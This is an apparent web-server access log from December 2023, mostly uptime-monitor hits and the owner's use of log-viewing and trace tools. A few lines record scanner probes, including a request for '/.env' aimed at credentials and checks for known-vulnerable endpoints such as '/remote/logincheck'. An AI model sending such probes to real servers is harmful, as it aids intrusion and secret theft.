159.203.109.206 - - [18/Dec/2023:04:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3775 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:04:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3776 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:04:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3777 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:04:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3778 "www@docker" "http://172.18.0.9:80" 1ms
184.105.139.68 - - [18/Dec/2023:04:29:22 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3779 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:04:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3780 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:04:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3781 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:04:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3782 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:04:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3783 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:04:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3784 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:04:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3785 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:04:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3786 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:04:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3787 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:04:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3788 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:04:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3789 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:04:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3790 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:04:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3791 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:04:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3792 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:04:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3793 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:04:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3794 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:04:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3795 "www@docker" "http://172.18.0.9:80" 0ms
184.105.139.68 - - [18/Dec/2023:04:36:49 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 3796 "-" "-" 0ms
91.92.243.232 - - [18/Dec/2023:04:37:20 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3797 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:04:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3798 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:04:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3799 "www@docker" "http://172.18.0.9:80" 0ms
184.105.139.68 - - [18/Dec/2023:04:37:55 +0000] "GET /dns-query?name=dnsscan.shadowserver.org&type=A HTTP/1.1" 404 19 "-" "-" 3800 "-" "-" 0ms
184.105.139.68 - - [18/Dec/2023:04:38:14 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3801 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:04:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3802 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:04:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3803 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:04:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3804 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:04:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3805 "www@docker" "http://172.18.0.9:80" 0ms
184.105.139.68 - - [18/Dec/2023:04:39:45 +0000] "GET /api/v2/static/not.found HTTP/1.1" 404 19 "-" "-" 3806 "-" "-" 0ms
184.105.139.68 - - [18/Dec/2023:04:39:56 +0000] "GET /remote/logincheck HTTP/1.1" 404 19 "-" "-" 3807 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:04:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3808 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:04:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3809 "www@docker" "http://172.18.0.9:80" 1ms
184.105.139.68 - - [18/Dec/2023:04:40:38 +0000] "GET /geoserver/web/ HTTP/1.1" 404 19 "-" "-" 3810 "-" "-" 0ms
143.198.85.59 - - [18/Dec/2023:04:41:09 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3811 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:04:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3812 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:04:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3813 "www@docker" "http://172.18.0.9:80" 0ms
54.37.79.75 - - [18/Dec/2023:04:42:16 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 3814 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [18/Dec/2023:04:42:16 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 3815 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:04:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3816 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:04:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3817 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:04:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3818 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:04:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3819 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:04:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3820 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:04:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3821 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:04:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3822 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:04:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3823 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:04:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3824 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:04:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3825 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:04:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3826 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:04:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3827 "www@docker" "http://172.18.0.9:80" 1ms
35.190.199.12 - - [18/Dec/2023:04:47:43 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3828 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:04:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3829 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:04:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3830 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [18/Dec/2023:04:48:47 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 3831 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [18/Dec/2023:04:48:47 +0000] "GET /logs/styles.css?version=15 HTTP/2.0" 304 0 "-" "-" 3832 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [18/Dec/2023:04:48:56 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 3834 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [18/Dec/2023:04:48:47 +0000] "GET /logs/logtail.php HTTP/2.0" 499 21 "-" "-" 3833 "www@docker" "http://172.18.0.9:80" 8468ms
173.48.140.140 - - [18/Dec/2023:04:48:58 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 3836 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [18/Dec/2023:04:48:56 +0000] "GET /logs/logtail.php HTTP/2.0" 499 21 "-" "-" 3835 "www@docker" "http://172.18.0.9:80" 2665ms
173.48.140.140 - - [18/Dec/2023:04:49:13 +0000] "GET /logs HTTP/2.0" 301 169 "-" "-" 3838 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [18/Dec/2023:04:48:59 +0000] "GET /logs/logtail.php HTTP/2.0" 499 21 "-" "-" 3837 "www@docker" "http://172.18.0.9:80" 14178ms
159.203.109.206 - - [18/Dec/2023:04:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3840 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [18/Dec/2023:04:49:13 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2669 "-" "-" 3839 "www@docker" "http://172.18.0.9:80" 13822ms
167.71.120.76 - - [18/Dec/2023:04:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3841 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:04:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3842 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:04:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3843 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:04:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3844 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:04:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3845 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [18/Dec/2023:04:51:39 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 3846 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [18/Dec/2023:04:51:39 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2727 "-" "-" 3847 "www@docker" "http://172.18.0.9:80" 25ms
173.48.140.140 - - [18/Dec/2023:04:51:51 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 3848 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [18/Dec/2023:04:51:51 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2720 "-" "-" 3849 "www@docker" "http://172.18.0.9:80" 17ms
173.48.140.140 - - [18/Dec/2023:04:52:12 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 3850 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [18/Dec/2023:04:52:12 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2722 "-" "-" 3851 "www@docker" "http://172.18.0.9:80" 24ms
173.48.140.140 - - [18/Dec/2023:04:52:14 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 3852 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [18/Dec/2023:04:52:14 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2724 "-" "-" 3853 "www@docker" "http://172.18.0.9:80" 13ms
173.48.140.140 - - [18/Dec/2023:04:52:18 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 3854 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [18/Dec/2023:04:52:18 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2725 "-" "-" 3855 "www@docker" "http://172.18.0.9:80" 16ms
159.203.109.206 - - [18/Dec/2023:04:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3856 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [18/Dec/2023:04:52:33 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 3857 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [18/Dec/2023:04:52:33 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2759 "-" "-" 3858 "www@docker" "http://172.18.0.9:80" 22ms
167.71.120.76 - - [18/Dec/2023:04:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3859 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:04:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3860 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:04:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3861 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [18/Dec/2023:04:54:10 +0000] "GET /trace/ HTTP/2.0" 200 6062 "-" "-" 3862 "livetrace@docker" "http://172.18.0.3:80" 6ms
173.48.140.140 - - [18/Dec/2023:04:54:10 +0000] "GET /trace/styles.css?version=11 HTTP/2.0" 304 0 "-" "-" 3863 "livetrace@docker" "http://172.18.0.3:80" 0ms
173.48.140.140 - - [18/Dec/2023:04:54:12 +0000] "GET /trace/startping.php?id=jy2alx5nq HTTP/2.0" 200 105 "-" "-" 3864 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [18/Dec/2023:04:54:12 +0000] "GET /trace/starttrace.php?id=aknib415g HTTP/2.0" 200 106 "-" "-" 3865 "livetrace@docker" "http://172.18.0.3:80" 5ms
173.48.140.140 - - [18/Dec/2023:04:54:13 +0000] "GET /trace/pollping.php?id=jy2alx5nq HTTP/2.0" 200 32 "-" "-" 3866 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:04:54:13 +0000] "GET /trace/polltrace.php?id=aknib415g HTTP/2.0" 200 552 "-" "-" 3867 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:04:54:14 +0000] "GET /trace/polltrace.php?id=aknib415g HTTP/2.0" 200 552 "-" "-" 3869 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:04:54:14 +0000] "GET /trace/pollping.php?id=jy2alx5nq HTTP/2.0" 200 58 "-" "-" 3868 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [18/Dec/2023:04:54:15 +0000] "GET /trace/pollping.php?id=jy2alx5nq HTTP/2.0" 200 83 "-" "-" 3870 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:04:54:15 +0000] "GET /trace/polltrace.php?id=aknib415g HTTP/2.0" 200 552 "-" "-" 3871 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:04:54:16 +0000] "GET /trace/polltrace.php?id=aknib415g HTTP/2.0" 200 803 "-" "-" 3873 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:04:54:16 +0000] "GET /trace/pollping.php?id=jy2alx5nq HTTP/2.0" 200 107 "-" "-" 3872 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:04:54:16 +0000] "GET /trace/cleantrace.php?id=aknib415g HTTP/2.0" 200 72 "-" "-" 3874 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:04:54:17 +0000] "GET /trace/pollping.php?id=jy2alx5nq HTTP/2.0" 200 133 "-" "-" 3875 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:04:54:18 +0000] "GET /trace/pollping.php?id=jy2alx5nq HTTP/2.0" 200 159 "-" "-" 3876 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:04:54:19 +0000] "GET /trace/pollping.php?id=jy2alx5nq HTTP/2.0" 200 184 "-" "-" 3877 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:04:54:20 +0000] "GET /trace/pollping.php?id=jy2alx5nq HTTP/2.0" 200 205 "-" "-" 3878 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:04:54:20 +0000] "GET /trace/cleanping.php?id=jy2alx5nq HTTP/2.0" 200 71 "-" "-" 3879 "livetrace@docker" "http://172.18.0.3:80" 2ms
159.203.109.206 - - [18/Dec/2023:04:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3880 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:04:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3881 "www@docker" "http://172.18.0.9:80" 0ms
107.170.252.38 - - [18/Dec/2023:04:54:53 +0000] "GET /actuator/health HTTP/1.1" 404 19 "-" "-" 3882 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:04:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3883 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:04:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3884 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:04:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3885 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:04:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3886 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:04:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3887 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:04:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3888 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:04:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3889 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:04:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3890 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:04:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3891 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:04:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3892 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3893 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3894 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3895 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:05:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3896 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [18/Dec/2023:05:01:58 +0000] "GET /trace/ HTTP/2.0" 200 6062 "-" "-" 3897 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [18/Dec/2023:05:02:02 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 3898 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [18/Dec/2023:05:02:02 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2403 "-" "-" 3899 "www@docker" "http://172.18.0.9:80" 108ms
159.203.109.206 - - [18/Dec/2023:05:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3900 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3901 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3902 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3903 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:05:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3904 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3905 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3906 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3907 "www@docker" "http://172.18.0.9:80" 0ms
87.121.69.16 - - [18/Dec/2023:05:06:22 +0000] "GET /json HTTP/1.1" 404 19 "-" "-" 3908 "dashboard@internal" "-" 3ms
159.203.109.206 - - [18/Dec/2023:05:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3909 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3910 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:05:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3911 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:05:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3912 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3913 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3914 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:05:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3915 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3916 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3917 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3918 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3919 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3920 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3921 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3922 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3923 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3924 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:05:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3925 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3926 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [18/Dec/2023:05:14:54 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3927 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:05:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3928 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:05:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3929 "www@docker" "http://172.18.0.9:80" 0ms
198.74.56.46 - - [18/Dec/2023:05:15:51 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3930 "-" "-" 0ms
173.48.140.140 - - [18/Dec/2023:05:16:01 +0000] "GET /trace/startping.php?id=3wpq6smaq HTTP/2.0" 200 105 "-" "-" 3931 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [18/Dec/2023:05:16:02 +0000] "GET /trace/pollping.php?id=3wpq6smaq HTTP/2.0" 200 33 "-" "-" 3932 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:05:16:03 +0000] "GET /trace/pollping.php?id=3wpq6smaq HTTP/2.0" 200 57 "-" "-" 3933 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:05:16:04 +0000] "GET /trace/pollping.php?id=3wpq6smaq HTTP/2.0" 200 83 "-" "-" 3934 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:05:16:05 +0000] "GET /trace/pollping.php?id=3wpq6smaq HTTP/2.0" 200 107 "-" "-" 3935 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:05:16:06 +0000] "GET /trace/pollping.php?id=3wpq6smaq HTTP/2.0" 200 129 "-" "-" 3936 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:05:16:07 +0000] "GET /trace/pollping.php?id=3wpq6smaq HTTP/2.0" 200 154 "-" "-" 3937 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:05:16:08 +0000] "GET /trace/pollping.php?id=3wpq6smaq HTTP/2.0" 200 179 "-" "-" 3938 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:05:16:09 +0000] "GET /trace/pollping.php?id=3wpq6smaq HTTP/2.0" 200 203 "-" "-" 3939 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:05:16:09 +0000] "GET /trace/cleanping.php?id=3wpq6smaq HTTP/2.0" 200 71 "-" "-" 3940 "livetrace@docker" "http://172.18.0.3:80" 2ms
159.203.109.206 - - [18/Dec/2023:05:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3941 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3942 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3943 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3944 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:05:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3945 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:05:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3946 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [18/Dec/2023:05:18:41 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3947 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:05:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3948 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:05:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3949 "www@docker" "http://172.18.0.9:80" 0ms
